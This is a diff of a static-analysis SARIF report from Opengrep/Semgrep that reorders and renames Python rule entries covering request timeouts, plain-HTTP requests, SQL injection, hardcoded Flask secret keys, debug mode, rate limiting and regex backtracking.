@@ -33,6 +33,27 @@
               }
             },
             {
+              "id": "4568ce1f-fc76-3ccb-a679-bad6f90690a6",
+              "name": "resources.rules.python.use-timeout",
+              "shortDescription": {
+                "text": "Opengrep Finding: resources.rules.python.use-timeout"
+              },
+              "fullDescription": {
+                "text": "By default, 'requests' calls wait until the connection is closed.\nThis means a 'requests' call without a timeout will hang the program\nif a response is never received. Consider setting a timeout for all\n'requests'.\n"
+              },
+              "defaultConfiguration": {
+                "enabled": true,
+                "level": "warning"
+              },
+              "help": {
+                "text": "By default, 'requests' calls wait until the connection is closed.\nThis means a 'requests' call without a timeout will hang the program\nif a response is never received. Consider setting a timeout for all\n'requests'.\n\n💎 Enable cross-file analysis and Pro rules for free at sg.run/pro",
+                "markdown": "By default, 'requests' calls wait until the connection is closed.\nThis means a 'requests' call without a timeout will hang the program\nif a response is never received. Consider setting a timeout for all\n'requests'.\n\n\n#### 💎 Enable cross-file analysis and Pro rules for free at <a href='https://sg.run/pro'>sg.run/pro</a>"
+              },
+              "properties": {
+                "precision": "very-high"
+              }
+            },
+            {
               "id": "a863a129-f894-3b6d-a8fe-740a9856d333",
               "name": "python.lang.security.audit.insecure-transport.requests.request-with-http.request-with-http",
               "shortDescription": {
@@ -55,7 +76,7 @@
               }
             },
             {
-              "id": "4568ce1f-fc76-3ccb-a679-bad6f90690a6",
+              "id": "082f3d8e-81f3-359b-919e-cb1aa8dca6e2",
               "name": "resources.rules.python.use-timeout",
               "shortDescription": {
                 "text": "Opengrep Finding: resources.rules.python.use-timeout"
@@ -76,21 +97,22 @@
               }
             },
             {
-              "id": "082f3d8e-81f3-359b-919e-cb1aa8dca6e2",
-              "name": "resources.rules.python.use-raise-for-status",
+              "id": "8e4d21d7-f881-305d-b031-ef5f82af0dca",
+              "name": "python.lang.security.audit.insecure-transport.requests.request-with-http.request-with-http",
               "shortDescription": {
-                "text": "Opengrep Finding: resources.rules.python.use-raise-for-status"
+                "text": "Opengrep Finding: python.lang.security.audit.insecure-transport.requests.request-with-http.request-with-http"
               },
               "fullDescription": {
-                "text": "There's an HTTP request made with requests,\nbut the raise_for_status() utility method isn't used.\nThis can result in request errors going unnoticed\nand your code behaving in unexpected ways,\nsuch as if your authorization API returns a 500 error\nwhile you're only checking for a 401."
+                "text": "Detected a request using 'http://'. This request will be unencrypted, and attackers could listen into traffic on the network and be able to obtain sensitive information. Use 'https://' instead."
               },
               "defaultConfiguration": {
                 "enabled": true,
-                "level": "warning"
+                "level": "note"
               },
+              "helpUri": "https://semgrep.dev/r/python.lang.security.audit.insecure-transport.requests.request-with-http.request-with-http",
               "help": {
-                "text": "There's an HTTP request made with requests,\nbut the raise_for_status() utility method isn't used.\nThis can result in request errors going unnoticed\nand your code behaving in unexpected ways,\nsuch as if your authorization API returns a 500 error\nwhile you're only checking for a 401.\n💎 Enable cross-file analysis and Pro rules for free at sg.run/pro",
-                "markdown": "There's an HTTP request made with requests,\nbut the raise_for_status() utility method isn't used.\nThis can result in request errors going unnoticed\nand your code behaving in unexpected ways,\nsuch as if your authorization API returns a 500 error\nwhile you're only checking for a 401.\n\n#### 💎 Enable cross-file analysis and Pro rules for free at <a href='https://sg.run/pro'>sg.run/pro</a>\n\n<b>References:</b>\n - [https://requests.readthedocs.io/en/master/api/#requests.Response.raise_for_status](https://requests.readthedocs.io/en/master/api/#requests.Response.raise_for_status)\n"
+                "text": "Detected a request using 'http://'. This request will be unencrypted, and attackers could listen into traffic on the network and be able to obtain sensitive information. Use 'https://' instead.\n💎 Enable cross-file analysis and Pro rules for free at sg.run/pro",
+                "markdown": "Detected a request using 'http://'. This request will be unencrypted, and attackers could listen into traffic on the network and be able to obtain sensitive information. Use 'https://' instead.\n\n#### 💎 Enable cross-file analysis and Pro rules for free at <a href='https://sg.run/pro'>sg.run/pro</a>\n\n<b>References:</b>\n - [Semgrep Rule](https://semgrep.dev/r/python.lang.security.audit.insecure-transport.requests.request-with-http.request-with-http)\n - [https://owasp.org/Top10/A02_2021-Cryptographic_Failures](https://owasp.org/Top10/A02_2021-Cryptographic_Failures)\n"
               },
               "properties": {
                 "precision": "very-high"
@@ -139,27 +161,6 @@
               }
             },
             {
-              "id": "d5d8f528-c81c-3b5d-b331-e568a52293b8",
-              "name": "resources.rules.python.sqlalchemy-execute-raw-query",
-              "shortDescription": {
-                "text": "Opengrep Finding: resources.rules.python.sqlalchemy-execute-raw-query"
-              },
-              "fullDescription": {
-                "text": "Avoiding SQL string concatenation: untrusted input concatinated with raw SQL query can result in SQL Injection. In order to execute raw query safely, prepared statement should be used. SQLAlchemy provides TextualSQL to easily used prepared statement with named parameters. For complexe SQL composition, use SQL Expression Languague or Schema Definition Language. In most cases, SQLAlchemy ORM will be a better option.\n"
-              },
-              "defaultConfiguration": {
-                "enabled": true,
-                "level": "error"
-              },
-              "help": {
-                "text": "Avoiding SQL string concatenation: untrusted input concatinated with raw SQL query can result in SQL Injection. In order to execute raw query safely, prepared statement should be used. SQLAlchemy provides TextualSQL to easily used prepared statement with named parameters. For complexe SQL composition, use SQL Expression Languague or Schema Definition Language. In most cases, SQLAlchemy ORM will be a better option.\n\n💎 Enable cross-file analysis and Pro rules for free at sg.run/pro",
-                "markdown": "Avoiding SQL string concatenation: untrusted input concatinated with raw SQL query can result in SQL Injection. In order to execute raw query safely, prepared statement should be used. SQLAlchemy provides TextualSQL to easily used prepared statement with named parameters. For complexe SQL composition, use SQL Expression Languague or Schema Definition Language. In most cases, SQLAlchemy ORM will be a better option.\n\n\n#### 💎 Enable cross-file analysis and Pro rules for free at <a href='https://sg.run/pro'>sg.run/pro</a>\n\n<b>References:</b>\n - [https://docs.sqlalchemy.org/en/14/core/tutorial.html#using-textual-sql](https://docs.sqlalchemy.org/en/14/core/tutorial.html#using-textual-sql)\n - [https://www.tutorialspoint.com/sqlalchemy/sqlalchemy_quick_guide.htm](https://www.tutorialspoint.com/sqlalchemy/sqlalchemy_quick_guide.htm)\n - [https://docs.sqlalchemy.org/en/14/core/tutorial.html#using-more-specific-text-with-table-expression-literal-column-and-expression-column](https://docs.sqlalchemy.org/en/14/core/tutorial.html#using-more-specific-text-with-table-expression-literal-column-and-expression-column)\n"
-              },
-              "properties": {
-                "precision": "very-high"
-              }
-            },
-            {
               "id": "67b70f35-d0ee-380e-84f8-e7fb9bf6a007",
               "name": "resources.rules.python.missing-ratelimit",
               "shortDescription": {
@@ -175,6 +176,27 @@
               "help": {
                 "text": "Function '$FUNC' is missing a rate-limiting decorator.\nHigh volume traffic to this function could starve application\nresources. Consider adding rate limiting from a library such\nas 'django-ratelimit'.\n\n💎 Enable cross-file analysis and Pro rules for free at sg.run/pro",
                 "markdown": "Function '$FUNC' is missing a rate-limiting decorator.\nHigh volume traffic to this function could starve application\nresources. Consider adding rate limiting from a library such\nas 'django-ratelimit'.\n\n\n#### 💎 Enable cross-file analysis and Pro rules for free at <a href='https://sg.run/pro'>sg.run/pro</a>\n\n<b>References:</b>\n - [https://github.com/jsocol/django-ratelimit/blob/main/docs/index.rst#quickstart](https://github.com/jsocol/django-ratelimit/blob/main/docs/index.rst#quickstart)\n"
+              },
+              "properties": {
+                "precision": "very-high"
+              }
+            },
+            {
+              "id": "d5d8f528-c81c-3b5d-b331-e568a52293b8",
+              "name": "resources.rules.python.sqlalchemy-execute-raw-query",
+              "shortDescription": {
+                "text": "Opengrep Finding: resources.rules.python.sqlalchemy-execute-raw-query"
+              },
+              "fullDescription": {
+                "text": "Avoiding SQL string concatenation: untrusted input concatinated with raw SQL query can result in SQL Injection. In order to execute raw query safely, prepared statement should be used. SQLAlchemy provides TextualSQL to easily used prepared statement with named parameters. For complexe SQL composition, use SQL Expression Languague or Schema Definition Language. In most cases, SQLAlchemy ORM will be a better option.\n"
+              },
+              "defaultConfiguration": {
+                "enabled": true,
+                "level": "error"
+              },
+              "help": {
+                "text": "Avoiding SQL string concatenation: untrusted input concatinated with raw SQL query can result in SQL Injection. In order to execute raw query safely, prepared statement should be used. SQLAlchemy provides TextualSQL to easily used prepared statement with named parameters. For complexe SQL composition, use SQL Expression Languague or Schema Definition Language. In most cases, SQLAlchemy ORM will be a better option.\n\n💎 Enable cross-file analysis and Pro rules for free at sg.run/pro",
+                "markdown": "Avoiding SQL string concatenation: untrusted input concatinated with raw SQL query can result in SQL Injection. In order to execute raw query safely, prepared statement should be used. SQLAlchemy provides TextualSQL to easily used prepared statement with named parameters. For complexe SQL composition, use SQL Expression Languague or Schema Definition Language. In most cases, SQLAlchemy ORM will be a better option.\n\n\n#### 💎 Enable cross-file analysis and Pro rules for free at <a href='https://sg.run/pro'>sg.run/pro</a>\n\n<b>References:</b>\n - [https://docs.sqlalchemy.org/en/14/core/tutorial.html#using-textual-sql](https://docs.sqlalchemy.org/en/14/core/tutorial.html#using-textual-sql)\n - [https://www.tutorialspoint.com/sqlalchemy/sqlalchemy_quick_guide.htm](https://www.tutorialspoint.com/sqlalchemy/sqlalchemy_quick_guide.htm)\n - [https://docs.sqlalchemy.org/en/14/core/tutorial.html#using-more-specific-text-with-table-expression-literal-column-and-expression-column](https://docs.sqlalchemy.org/en/14/core/tutorial.html#using-more-specific-text-with-table-expression-literal-column-and-expression-column)\n"
               },
               "properties": {
                 "precision": "very-high"
@@ -224,20 +246,20 @@
             },
             {
               "id": "cad7b472-33c5-3120-b2c7-5ade94ef63f3",
-              "name": "resources.rules.python.sqlalchemy-execute-raw-query",
+              "name": "resources.rules.python.formatted-sql-query",
               "shortDescription": {
-                "text": "Opengrep Finding: resources.rules.python.sqlalchemy-execute-raw-query"
+                "text": "Opengrep Finding: resources.rules.python.formatted-sql-query"
               },
               "fullDescription": {
-                "text": "Avoiding SQL string concatenation: untrusted input concatinated with raw SQL query can result in SQL Injection. In order to execute raw query safely, prepared statement should be used. SQLAlchemy provides TextualSQL to easily used prepared statement with named parameters. For complexe SQL composition, use SQL Expression Languague or Schema Definition Language. In most cases, SQLAlchemy ORM will be a better option.\n"
+                "text": "Detected possible formatted SQL query. Use parameterized queries instead.\n"
               },
               "defaultConfiguration": {
                 "enabled": true,
-                "level": "error"
+                "level": "warning"
               },
               "help": {
-                "text": "Avoiding SQL string concatenation: untrusted input concatinated with raw SQL query can result in SQL Injection. In order to execute raw query safely, prepared statement should be used. SQLAlchemy provides TextualSQL to easily used prepared statement with named parameters. For complexe SQL composition, use SQL Expression Languague or Schema Definition Language. In most cases, SQLAlchemy ORM will be a better option.\n\n💎 Enable cross-file analysis and Pro rules for free at sg.run/pro",
-                "markdown": "Avoiding SQL string concatenation: untrusted input concatinated with raw SQL query can result in SQL Injection. In order to execute raw query safely, prepared statement should be used. SQLAlchemy provides TextualSQL to easily used prepared statement with named parameters. For complexe SQL composition, use SQL Expression Languague or Schema Definition Language. In most cases, SQLAlchemy ORM will be a better option.\n\n\n#### 💎 Enable cross-file analysis and Pro rules for free at <a href='https://sg.run/pro'>sg.run/pro</a>\n\n<b>References:</b>\n - [https://docs.sqlalchemy.org/en/14/core/tutorial.html#using-textual-sql](https://docs.sqlalchemy.org/en/14/core/tutorial.html#using-textual-sql)\n - [https://www.tutorialspoint.com/sqlalchemy/sqlalchemy_quick_guide.htm](https://www.tutorialspoint.com/sqlalchemy/sqlalchemy_quick_guide.htm)\n - [https://docs.sqlalchemy.org/en/14/core/tutorial.html#using-more-specific-text-with-table-expression-literal-column-and-expression-column](https://docs.sqlalchemy.org/en/14/core/tutorial.html#using-more-specific-text-with-table-expression-literal-column-and-expression-column)\n"
+                "text": "Detected possible formatted SQL query. Use parameterized queries instead.\n\n💎 Enable cross-file analysis and Pro rules for free at sg.run/pro",
+                "markdown": "Detected possible formatted SQL query. Use parameterized queries instead.\n\n\n#### 💎 Enable cross-file analysis and Pro rules for free at <a href='https://sg.run/pro'>sg.run/pro</a>\n\n<b>References:</b>\n - [https://stackoverflow.com/questions/775296/mysql-parameterized-queries](https://stackoverflow.com/questions/775296/mysql-parameterized-queries)\n"
               },
               "properties": {
                 "precision": "very-high"
@@ -265,27 +287,6 @@
               }
             },
             {
-              "id": "28a8f063-18ec-3055-a65f-490ad91616c6",
-              "name": "resources.rules.python.avoid_hardcoded_config_SECRET_KEY",
-              "shortDescription": {
-                "text": "Opengrep Finding: resources.rules.python.avoid_hardcoded_config_SECRET_KEY"
-              },
-              "fullDescription": {
-                "text": "Hardcoded variable `SECRET_KEY` detected. Use environment variables or config files instead"
-              },
-              "defaultConfiguration": {
-                "enabled": true,
-                "level": "error"
-              },
-              "help": {
-                "text": "Hardcoded variable `SECRET_KEY` detected. Use environment variables or config files instead\n💎 Enable cross-file analysis and Pro rules for free at sg.run/pro",
-                "markdown": "Hardcoded variable `SECRET_KEY` detected. Use environment variables or config files instead\n\n#### 💎 Enable cross-file analysis and Pro rules for free at <a href='https://sg.run/pro'>sg.run/pro</a>\n\n<b>References:</b>\n - [https://bento.dev/checks/flask/avoid-hardcoded-config/](https://bento.dev/checks/flask/avoid-hardcoded-config/)\n - [https://flask.palletsprojects.com/en/1.1.x/config/?highlight=configuration#builtin-configuration-values](https://flask.palletsprojects.com/en/1.1.x/config/?highlight=configuration#builtin-configuration-values)\n - [https://flask.palletsprojects.com/en/1.1.x/config/?highlight=configuration#environment-and-debug-features](https://flask.palletsprojects.com/en/1.1.x/config/?highlight=configuration#environment-and-debug-features)\n"
-              },
-              "properties": {
-                "precision": "very-high"
-              }
-            },
-            {
               "id": "52f85297-1c05-3401-a843-e564d76b7187",
               "name": "resources.rules.python.flask-app-route-handler",
               "shortDescription": {
@@ -301,6 +302,28 @@
               "help": {
                 "text": "Flask HTTP route $ROUTE will handle $METHOD requests\n💎 Enable cross-file analysis and Pro rules for free at sg.run/pro",
                 "markdown": "Flask HTTP route $ROUTE will handle $METHOD requests\n\n#### 💎 Enable cross-file analysis and Pro rules for free at <a href='https://sg.run/pro'>sg.run/pro</a>"
+              },
+              "properties": {
+                "precision": "very-high"
+              }
+            },
+            {
+              "id": "28a8f063-18ec-3055-a65f-490ad91616c6",
+              "name": "python.flask.security.audit.hardcoded-config.avoid_hardcoded_config_SECRET_KEY",
+              "shortDescription": {
+                "text": "Opengrep Finding: python.flask.security.audit.hardcoded-config.avoid_hardcoded_config_SECRET_KEY"
+              },
+              "fullDescription": {
+                "text": "Hardcoded variable `SECRET_KEY` detected. Use environment variables or config files instead"
+              },
+              "defaultConfiguration": {
+                "enabled": true,
+                "level": "error"
+              },
+              "helpUri": "https://semgrep.dev/r/python.flask.security.audit.hardcoded-config.avoid_hardcoded_config_SECRET_KEY",
+              "help": {
+                "text": "Hardcoded variable `SECRET_KEY` detected. Use environment variables or config files instead\n💎 Enable cross-file analysis and Pro rules for free at sg.run/pro",
+                "markdown": "Hardcoded variable `SECRET_KEY` detected. Use environment variables or config files instead\n\n#### 💎 Enable cross-file analysis and Pro rules for free at <a href='https://sg.run/pro'>sg.run/pro</a>\n\n<b>References:</b>\n - [Semgrep Rule](https://semgrep.dev/r/python.flask.security.audit.hardcoded-config.avoid_hardcoded_config_SECRET_KEY)\n - [https://bento.dev/checks/flask/avoid-hardcoded-config/](https://bento.dev/checks/flask/avoid-hardcoded-config/)\n - [https://flask.palletsprojects.com/en/1.1.x/config/?highlight=configuration#builtin-configuration-values](https://flask.palletsprojects.com/en/1.1.x/config/?highlight=configuration#builtin-configuration-values)\n - [https://flask.palletsprojects.com/en/1.1.x/config/?highlight=configuration#environment-and-debug-features](https://flask.palletsprojects.com/en/1.1.x/config/?highlight=configuration#environment-and-debug-features)\n"
               },
               "properties": {
                 "precision": "very-high"
@@ -391,27 +414,6 @@
               }
             },
             {
-              "id": "232084fd-c209-3fd2-ad2f-5888b440fb18",
-              "name": "resources.rules.python.avoid_using_app_run_directly",
-              "shortDescription": {
-                "text": "Opengrep Finding: resources.rules.python.avoid_using_app_run_directly"
-              },
-              "fullDescription": {
-                "text": "top-level app.run(...) is ignored by flask. Consider putting app.run(...) behind a guard, like inside a function"
-              },
-              "defaultConfiguration": {
-                "enabled": true,
-                "level": "warning"
-              },
-              "help": {
-                "text": "top-level app.run(...) is ignored by flask. Consider putting app.run(...) behind a guard, like inside a function\n💎 Enable cross-file analysis and Pro rules for free at sg.run/pro",
-                "markdown": "top-level app.run(...) is ignored by flask. Consider putting app.run(...) behind a guard, like inside a function\n\n#### 💎 Enable cross-file analysis and Pro rules for free at <a href='https://sg.run/pro'>sg.run/pro</a>"
-              },
-              "properties": {
-                "precision": "very-high"
-              }
-            },
-            {
               "id": "1851193b-46ea-33cd-bd16-0fa3d1f2d8a6",
               "name": "resources.rules.python.dlint-catastrophic-redos",
               "shortDescription": {
@@ -427,6 +429,27 @@
               "help": {
                 "text": "Regex `$X` may be vulnerable to catastrophic backtracking, which may lead to denial of service attacks. (This rule only matches regex usage, not actual REDoS patterns. For full detection, use Semgrep Pro Engine.)\n💎 Enable cross-file analysis and Pro rules for free at sg.run/pro",
                 "markdown": "Regex `$X` may be vulnerable to catastrophic backtracking, which may lead to denial of service attacks. (This rule only matches regex usage, not actual REDoS patterns. For full detection, use Semgrep Pro Engine.)\n\n#### 💎 Enable cross-file analysis and Pro rules for free at <a href='https://sg.run/pro'>sg.run/pro</a>\n\n<b>References:</b>\n - [https://r2c.dev/blog/2020/finding-python-redos-bugs-at-scale-using-dlint-and-r2c/](https://r2c.dev/blog/2020/finding-python-redos-bugs-at-scale-using-dlint-and-r2c/)\n - [https://r2c.dev/blog/2020/improving-redos-detection-with-dlint-and-r2c/](https://r2c.dev/blog/2020/improving-redos-detection-with-dlint-and-r2c/)\n"
+              },
+              "properties": {
+                "precision": "very-high"
+              }
+            },
+            {
+              "id": "232084fd-c209-3fd2-ad2f-5888b440fb18",
+              "name": "resources.rules.python.debug-enabled",
+              "shortDescription": {
+                "text": "Opengrep Finding: resources.rules.python.debug-enabled"
+              },
+              "fullDescription": {
+                "text": "Detected Flask app with debug=True. Do not deploy to production with this flag enabled\nas it will leak sensitive information. Instead, consider using Flask configuration\nvariables or setting 'debug' using system environment variables.\n"
+              },
+              "defaultConfiguration": {
+                "enabled": true,
+                "level": "warning"
+              },
+              "help": {
+                "text": "Detected Flask app with debug=True. Do not deploy to production with this flag enabled\nas it will leak sensitive information. Instead, consider using Flask configuration\nvariables or setting 'debug' using system environment variables.\n\n💎 Enable cross-file analysis and Pro rules for free at sg.run/pro",
+                "markdown": "Detected Flask app with debug=True. Do not deploy to production with this flag enabled\nas it will leak sensitive information. Instead, consider using Flask configuration\nvariables or setting 'debug' using system environment variables.\n\n\n#### 💎 Enable cross-file analysis and Pro rules for free at <a href='https://sg.run/pro'>sg.run/pro</a>\n\n<b>References:</b>\n - [https://labs.detectify.com/2015/10/02/how-patreon-got-hacked-publicly-exposed-werkzeug-debugger/](https://labs.detectify.com/2015/10/02/how-patreon-got-hacked-publicly-exposed-werkzeug-debugger/)\n"
               },
               "properties": {
                 "precision": "very-high"
@@ -454,27 +477,6 @@
               }
             },
             {
-              "id": "fcea9357-e3af-3bcc-b917-b935597c5f92",
-              "name": "resources.rules.python.dlint-catastrophic-redos",
-              "shortDescription": {
-                "text": "Opengrep Finding: resources.rules.python.dlint-catastrophic-redos"
-              },
-              "fullDescription": {
-                "text": "Regex `$X` may be vulnerable to catastrophic backtracking, which may lead to denial of service attacks. (This rule only matches regex usage, not actual REDoS patterns. For full detection, use Semgrep Pro Engine.)"
-              },
-              "defaultConfiguration": {
-                "enabled": true,
-                "level": "error"
-              },
-              "help": {
-                "text": "Regex `$X` may be vulnerable to catastrophic backtracking, which may lead to denial of service attacks. (This rule only matches regex usage, not actual REDoS patterns. For full detection, use Semgrep Pro Engine.)\n💎 Enable cross-file analysis and Pro rules for free at sg.run/pro",
-                "markdown": "Regex `$X` may be vulnerable to catastrophic backtracking, which may lead to denial of service attacks. (This rule only matches regex usage, not actual REDoS patterns. For full detection, use Semgrep Pro Engine.)\n\n#### 💎 Enable cross-file analysis and Pro rules for free at <a href='https://sg.run/pro'>sg.run/pro</a>\n\n<b>References:</b>\n - [https://r2c.dev/blog/2020/finding-python-redos-bugs-at-scale-using-dlint-and-r2c/](https://r2c.dev/blog/2020/finding-python-redos-bugs-at-scale-using-dlint-and-r2c/)\n - [https://r2c.dev/blog/2020/improving-redos-detection-with-dlint-and-r2c/](https://r2c.dev/blog/2020/improving-redos-detection-with-dlint-and-r2c/)\n"
-              },
-              "properties": {
-                "precision": "very-high"
-              }
-            },
-            {
               "id": "6c0cd598-8cc9-34e6-918a-dd097c577ae2",
               "name": "resources.rules.python.dlint-catastrophic-redos",
               "shortDescription": {
@@ -496,21 +498,42 @@
               }
             },
             {
-              "id": "028e7d1e-0a81-3522-9d28-210152e6f2b1",
-              "name": "resources.rules.python.use-timeout",
+              "id": "e76e6ef2-7d3a-3558-97ee-9b43b4603980",
+              "name": "resources.rules.python.request-with-http",
               "shortDescription": {
-                "text": "Opengrep Finding: resources.rules.python.use-timeout"
+                "text": "Opengrep Finding: resources.rules.python.request-with-http"
               },
               "fullDescription": {
-                "text": "By default, 'requests' calls wait until the connection is closed.\nThis means a 'requests' call without a timeout will hang the program\nif a response is never received. Consider setting a timeout for all\n'requests'.\n"
+                "text": "Detected a request using 'http://'. This request will be unencrypted. Use 'https://' instead.\n"
               },
               "defaultConfiguration": {
                 "enabled": true,
-                "level": "warning"
+                "level": "error"
               },
               "help": {
-                "text": "By default, 'requests' calls wait until the connection is closed.\nThis means a 'requests' call without a timeout will hang the program\nif a response is never received. Consider setting a timeout for all\n'requests'.\n\n💎 Enable cross-file analysis and Pro rules for free at sg.run/pro",
-                "markdown": "By default, 'requests' calls wait until the connection is closed.\nThis means a 'requests' call without a timeout will hang the program\nif a response is never received. Consider setting a timeout for all\n'requests'.\n\n\n#### 💎 Enable cross-file analysis and Pro rules for free at <a href='https://sg.run/pro'>sg.run/pro</a>"
+                "text": "Detected a request using 'http://'. This request will be unencrypted. Use 'https://' instead.\n\n💎 Enable cross-file analysis and Pro rules for free at sg.run/pro",
+                "markdown": "Detected a request using 'http://'. This request will be unencrypted. Use 'https://' instead.\n\n\n#### 💎 Enable cross-file analysis and Pro rules for free at <a href='https://sg.run/pro'>sg.run/pro</a>"
+              },
+              "properties": {
+                "precision": "very-high"
+              }
+            },
+            {
+              "id": "fcea9357-e3af-3bcc-b917-b935597c5f92",
+              "name": "resources.rules.python.dlint-catastrophic-redos",
+              "shortDescription": {
+                "text": "Opengrep Finding: resources.rules.python.dlint-catastrophic-redos"
+              },
+              "fullDescription": {
+                "text": "Regex `$X` may be vulnerable to catastrophic backtracking, which may lead to denial of service attacks. (This rule only matches regex usage, not actual REDoS patterns. For full detection, use Semgrep Pro Engine.)"
+              },
+              "defaultConfiguration": {
+                "enabled": true,
+                "level": "error"
+              },
+              "help": {
+                "text": "Regex `$X` may be vulnerable to catastrophic backtracking, which may lead to denial of service attacks. (This rule only matches regex usage, not actual REDoS patterns. For full detection, use Semgrep Pro Engine.)\n💎 Enable cross-file analysis and Pro rules for free at sg.run/pro",
+                "markdown": "Regex `$X` may be vulnerable to catastrophic backtracking, which may lead to denial of service attacks. (This rule only matches regex usage, not actual REDoS patterns. For full detection, use Semgrep Pro Engine.)\n\n#### 💎 Enable cross-file analysis and Pro rules for free at <a href='https://sg.run/pro'>sg.run/pro</a>\n\n<b>References:</b>\n - [https://r2c.dev/blog/2020/finding-python-redos-bugs-at-scale-using-dlint-and-r2c/](https://r2c.dev/blog/2020/finding-python-redos-bugs-at-scale-using-dlint-and-r2c/)\n - [https://r2c.dev/blog/2020/improving-redos-detection-with-dlint-and-r2c/](https://r2c.dev/blog/2020/improving-redos-detection-with-dlint-and-r2c/)\n"
               },
               "properties": {
                 "precision": "very-high"
@@ -539,6 +562,27 @@
               }
             },
             {
+              "id": "3cddfbe8-b0d1-333c-a688-50e808bde6e4",
+              "name": "resources.rules.python.missing-ratelimit",
+              "shortDescription": {
+                "text": "Opengrep Finding: resources.rules.python.missing-ratelimit"
+              },
+              "fullDescription": {
+                "text": "Function '$FUNC' is missing a rate-limiting decorator.\nHigh volume traffic to this function could starve application\nresources. Consider adding rate limiting from a library such\nas 'django-ratelimit'.\n"
+              },
+              "defaultConfiguration": {
+                "enabled": true,
+                "level": "warning"
+              },
+              "help": {
+                "text": "Function '$FUNC' is missing a rate-limiting decorator.\nHigh volume traffic to this function could starve application\nresources. Consider adding rate limiting from a library such\nas 'django-ratelimit'.\n\n💎 Enable cross-file analysis and Pro rules for free at sg.run/pro",
+                "markdown": "Function '$FUNC' is missing a rate-limiting decorator.\nHigh volume traffic to this function could starve application\nresources. Consider adding rate limiting from a library such\nas 'django-ratelimit'.\n\n\n#### 💎 Enable cross-file analysis and Pro rules for free at <a href='https://sg.run/pro'>sg.run/pro</a>\n\n<b>References:</b>\n - [https://github.com/jsocol/django-ratelimit/blob/main/docs/index.rst#quickstart](https://github.com/jsocol/django-ratelimit/blob/main/docs/index.rst#quickstart)\n"
+              },
+              "properties": {
+                "precision": "very-high"
+              }
+            },
+            {
               "id": "40ea9e2b-fabe-3b6f-968b-c2c1622d157c",
               "name": "resources.rules.python.missing-ratelimit",
               "shortDescription": {
@@ -560,7 +604,7 @@
               }
             },
             {
-              "id": "3cddfbe8-b0d1-333c-a688-50e808bde6e4",
+              "id": "7598c3d7-65fc-32e9-b603-ab629f25d18f",
               "name": "resources.rules.python.missing-ratelimit",
               "shortDescription": {
                 "text": "Opengrep Finding: resources.rules.python.missing-ratelimit"
@@ -602,48 +646,6 @@
               }
             },
             {
-              "id": "0f346dfa-0f58-31fe-bdc2-a8cc48f62743",
-              "name": "resources.rules.python.code-after-unconditional-return",
-              "shortDescription": {
-                "text": "Opengrep Finding: resources.rules.python.code-after-unconditional-return"
-              },
-              "fullDescription": {
-                "text": "code after return statement will not be executed"
-              },
-              "defaultConfiguration": {
-                "enabled": true,
-                "level": "warning"
-              },
-              "help": {
-                "text": "code after return statement will not be executed\n💎 Enable cross-file analysis and Pro rules for free at sg.run/pro",
-                "markdown": "code after return statement will not be executed\n\n#### 💎 Enable cross-file analysis and Pro rules for free at <a href='https://sg.run/pro'>sg.run/pro</a>"
-              },
-              "properties": {
-                "precision": "very-high"
-              }
-            },
-            {
-              "id": "7598c3d7-65fc-32e9-b603-ab629f25d18f",
-              "name": "resources.rules.python.missing-ratelimit",
-              "shortDescription": {
-                "text": "Opengrep Finding: resources.rules.python.missing-ratelimit"
-              },
-              "fullDescription": {
-                "text": "Function '$FUNC' is missing a rate-limiting decorator.\nHigh volume traffic to this function could starve application\nresources. Consider adding rate limiting from a library such\nas 'django-ratelimit'.\n"
-              },
-              "defaultConfiguration": {
-                "enabled": true,
-                "level": "warning"
-              },
-              "help": {
-                "text": "Function '$FUNC' is missing a rate-limiting decorator.\nHigh volume traffic to this function could starve application\nresources. Consider adding rate limiting from a library such\nas 'django-ratelimit'.\n\n💎 Enable cross-file analysis and Pro rules for free at sg.run/pro",
-                "markdown": "Function '$FUNC' is missing a rate-limiting decorator.\nHigh volume traffic to this function could starve application\nresources. Consider adding rate limiting from a library such\nas 'django-ratelimit'.\n\n\n#### 💎 Enable cross-file analysis and Pro rules for free at <a href='https://sg.run/pro'>sg.run/pro</a>\n\n<b>References:</b>\n - [https://github.com/jsocol/django-ratelimit/blob/main/docs/index.rst#quickstart](https://github.com/jsocol/django-ratelimit/blob/main/docs/index.rst#quickstart)\n"
-              },
-              "properties": {
-                "precision": "very-high"
-              }
-            },
-            {
               "id": "ecbd55a2-cc94-343e-aa5a-97ff01b5aa77",
               "name": "resources.rules.python.sqlalchemy-execute-raw-query",
               "shortDescription": {
@@ -659,6 +661,27 @@
               "help": {
                 "text": "Avoiding SQL string concatenation: untrusted input concatinated with raw SQL query can result in SQL Injection. In order to execute raw query safely, prepared statement should be used. SQLAlchemy provides TextualSQL to easily used prepared statement with named parameters. For complexe SQL composition, use SQL Expression Languague or Schema Definition Language. In most cases, SQLAlchemy ORM will be a better option.\n\n💎 Enable cross-file analysis and Pro rules for free at sg.run/pro",
                 "markdown": "Avoiding SQL string concatenation: untrusted input concatinated with raw SQL query can result in SQL Injection. In order to execute raw query safely, prepared statement should be used. SQLAlchemy provides TextualSQL to easily used prepared statement with named parameters. For complexe SQL composition, use SQL Expression Languague or Schema Definition Language. In most cases, SQLAlchemy ORM will be a better option.\n\n\n#### 💎 Enable cross-file analysis and Pro rules for free at <a href='https://sg.run/pro'>sg.run/pro</a>\n\n<b>References:</b>\n - [https://docs.sqlalchemy.org/en/14/core/tutorial.html#using-textual-sql](https://docs.sqlalchemy.org/en/14/core/tutorial.html#using-textual-sql)\n - [https://www.tutorialspoint.com/sqlalchemy/sqlalchemy_quick_guide.htm](https://www.tutorialspoint.com/sqlalchemy/sqlalchemy_quick_guide.htm)\n - [https://docs.sqlalchemy.org/en/14/core/tutorial.html#using-more-specific-text-with-table-expression-literal-column-and-expression-column](https://docs.sqlalchemy.org/en/14/core/tutorial.html#using-more-specific-text-with-table-expression-literal-column-and-expression-column)\n"
+              },
+              "properties": {
+                "precision": "very-high"
+              }
+            },
+            {
+              "id": "0f346dfa-0f58-31fe-bdc2-a8cc48f62743",
+              "name": "resources.rules.python.code-after-unconditional-return",
+              "shortDescription": {
+                "text": "Opengrep Finding: resources.rules.python.code-after-unconditional-return"
+              },
+              "fullDescription": {
+                "text": "code after return statement will not be executed"
+              },
+              "defaultConfiguration": {
+                "enabled": true,
+                "level": "warning"
+              },
+              "help": {
+                "text": "code after return statement will not be executed\n💎 Enable cross-file analysis and Pro rules for free at sg.run/pro",
+                "markdown": "code after return statement will not be executed\n\n#### 💎 Enable cross-file analysis and Pro rules for free at <a href='https://sg.run/pro'>sg.run/pro</a>"
               },
               "properties": {
                 "precision": "very-high"
@@ -707,27 +730,6 @@
               }
             },
             {
